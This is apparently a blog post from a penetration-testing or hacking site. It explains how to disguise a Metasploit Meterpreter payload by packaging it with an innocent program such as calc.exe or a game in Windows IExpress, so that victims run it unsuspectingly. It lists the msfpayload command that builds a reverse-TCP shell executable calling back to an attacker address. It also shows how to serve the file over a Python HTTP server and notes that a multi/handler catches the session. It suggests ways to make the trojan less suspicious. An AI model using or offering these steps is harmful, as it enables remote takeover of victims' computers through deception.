<div class="header">
  <h1>Metasploit heart&#39;s Microsoft</h1>
  <h2></h2>
</div>
<div class="content">
  <p><a href="http://vimeo.com/3440084">Hiding Meterpreter with IExpress</a> from <a href="http://vimeo.com/user780705">mubix</a> on <a href="http://vimeo.com">Vimeo</a>.</p>

<p>Using the IExpress, a built in tool (XP, not sure about other Windows versions), we package two executables together, so that the target is less likely to suspect foul play. Now, I used calc.exe, but you can use anything on both sides of the coin. Use a better game so that it&rsquo;s easyier to dupe, or a different malicious executable (leekspin perhaps?).</p>

<p>I&rsquo;ll let your minds take this to the level I know you all are capable of. One caveat is that the icon for the executable is that of the self extractor, which shouldn&rsquo;t be that much of an issue to change, but I don&rsquo;t know off the top of my head of an app that does it, so please comment and let me know if you do.</p>

<p>Commands from video:</p>

<ul>
<li><p>./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=1080 X &gt; /tmp/academy/bob.exe</p></li>

<li><p>(For python 2.4+) python -m SimpleHTTPServer</p></li>

<li><p>(For python 2.3 -)Â python -c &ldquo;from SimpleHTTPServer import test; test()&rdquo;</p></li>

<li><p>Start -&gt; Run -&gt; iexpress <return></p></li>

<li><p>Run multi/hander from command line (not shown in video)</p></li>
</ul>
